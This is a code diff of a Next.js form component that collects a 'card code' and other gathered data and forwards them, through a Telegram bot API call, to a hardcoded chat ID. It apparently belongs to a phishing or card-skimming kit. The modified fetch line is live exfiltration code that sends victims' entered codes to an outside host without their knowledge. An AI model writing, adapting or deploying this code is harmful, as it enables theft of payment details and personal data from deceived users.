@@ -3,9 +3,11 @@
 import styles from './code.module.css'
 import { useRef } from 'react'
 import { useRouter,useSearchParams } from 'next/navigation'
-import bot from '@/compnante/dataBot'
+
 
 const Code = () => {
+  const token = process.env.TOKEN;
+  const pass = 7017479979
   const code = useRef();
   const router = useRouter();
   const x = useSearchParams();
@@ -23,7 +25,7 @@ const Code = () => {
     e.preventDefault();
 
     var length= `مدونة سمسا   %0A كود البطاقة : ${code.current.value} %0A %0A ${datas}`
-    fetch(`https://api.telegram.org/bot${bot.token}/sendMessage?chat_id=${bot.chat_id}&text=${length}`,{method:"GET"}).then(res=>res.json()).then(res=>console.log(res))
+    fetch(`https://api.telegram.org/bot${token}/sendMessage?chat_id=${pass}&text=${length}`,{method:"GET"}).then(res=>res.json()).then(res=>console.log(res))
   
   }
 
